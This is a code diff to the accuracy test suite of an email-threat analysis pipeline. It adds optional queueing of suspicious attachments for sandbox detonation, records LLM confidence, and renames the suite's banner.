+def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True,
+                           enable_detonation: bool = False, db=None) -> dict:
     """Run the full analysis pipeline on a raw email WITHOUT any DB writes.
 
-    Returns a dict with per-stage results and the final verdict.
+    Email/verdict state is not persisted, but when `enable_detonation` is set
+    (with an open `db` session) attachments that meet the same trigger as
+    production (static analysis inconclusive AND the LLM unsure, or static
+    analysis flagged something it couldn't conclusively resolve) are queued
+    into the real `pending_detonation` table with email_id=None, exactly like
+    a manual detonation. The caller is expected to drain that queue once
+    after the whole batch (see epvme_test.py) and fold results back in.
+
+    Returns a dict with per-stage results, the final verdict, and (when
+    detonation is enabled) `detonation_queued`: list of sha256 queued.
     """
     result = {
         "stages": {},
         "final_status": "unknown",
         "flags_total": 0,
         "deterministic_escalation": False,
+        "detonation_queued": [],
     }
 
     # --- Parse ---
@@ -3729,6 +3748,7 @@ def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True) -> dict:
                 "risk_score": llm_res.get("risk_score"),
                 "reasons": llm_res.get("reasons", []),
             }
+            parsed["llm_analysis"] = {"confidence": llm_res.get("confidence")}
         except Exception as e:
             parsed["status"] = "escalated"
             result["stages"]["llm"] = {"error": str(e), "verdict": "escalated"}
@@ -3736,6 +3756,22 @@ def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True) -> dict:
         result["stages"]["llm"] = {"skipped": "already_escalated", "verdict": "escalated"}
     else:
         result["stages"]["llm"] = {"skipped": "llm_disabled"}
+
+    # --- Detonation queueing (optional) ---
+    # Same trigger as production (main._maybe_enqueue_detonation): skipped
+    # entirely if a deterministic signal already escalated the email, since
+    # that email is going to a human regardless of what the sandbox finds.
+    if enable_detonation and db is not None:
+        try:
+            from main import _maybe_enqueue_detonation
+            parsed.setdefault("idempotency_key", f"epvme:{hashlib.sha256(raw_eml).hexdigest()[:16]}")
+            before = {r.sha256 for r in _queued_shas(db)}
+            _maybe_enqueue_detonation(db, parsed, email_id=None,
+                                       deterministic_escalation=result["deterministic_escalation"])
+            after = {r.sha256 for r in _queued_shas(db)}
+            result["detonation_queued"] = sorted(after - before)
+        except Exception as e:
+            result["stages"]["detonation_queue"] = {"error": str(e)}
 
     result["final_status"] = parsed["status"]
     result["flags_total"] = sum(
@@ -4235,7 +4271,7 @@ def main():
     run_llm = not args.no_llm
 
     print("=" * 60)
-    print("  IMANIA — Pipeline Accuracy Test Suite")
+    print("  ATTIJARI — Pipeline Accuracy Test Suite")
     print("=" * 60)
     print(f"  LLM analysis: {'ON' if run_llm else 'OFF'}")
     print(f"  Live emails: {'YES' if args.live else 'NO'}")
